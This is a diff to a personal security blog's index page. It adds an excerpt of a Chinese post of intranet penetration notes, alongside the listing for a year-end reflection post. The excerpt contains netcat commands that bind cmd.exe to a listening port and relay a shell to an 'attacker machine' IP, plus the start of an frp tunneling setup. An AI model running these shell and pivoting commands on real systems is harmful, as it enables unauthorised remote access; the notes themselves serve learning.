@@ -38,6 +38,25 @@
                 <div class="post-list">
     
     <div class="post">
+        <a class="post-title" href="/2022/05/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%A4%87%E5%BF%98%E5%BD%95/">#内网渗透备忘录</a>
+        <div class="post-except">
+            0x00 前言接触安全数月有余，整理一下内网学习笔记。
+0x01 内网穿透#nc内网穿透&#x2F;&#x2F;攻击机执行
+nc -lvp 3333
+
+&#x2F;&#x2F;目标机执行
+nc -lvp 3333 -e c:\windows\system32\cmd.exe
+
+&#x2F;&#x2F;中间机执行  
+ nc -v 攻击机ip 3333 -e “nc -v 目标机ip 3333”
+
+#frp内网穿透配置&#x2F;&#x2F;内网机器上安装frpc，并修改 fr
+            <a class="read-more" href="/2022/05/22/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%A4%87%E5%BF%98%E5%BD%95/"> ... </a>
+        </div>
+        <div class="post-date">2022.05.22</div>
+    </div>
+    
+    <div class="post">
         <a class="post-title" href="/2021/12/31/%E8%87%B4%E6%95%AC%E6%88%91%E8%BF%99%E6%B7%B7%E6%B2%8C%E7%9A%842021/">#致敬我这混沌的2021</a>
         <div class="post-except">
             致敬我这混沌的2021尽管在我看来我的2021好像与前十几年并没有什么不同，终归都是浑浑噩噩，混混沌沌，但临近年末，看着大佬们的年度总结，感慨万千，思来想去总归是该写点文字来纪念2021的。
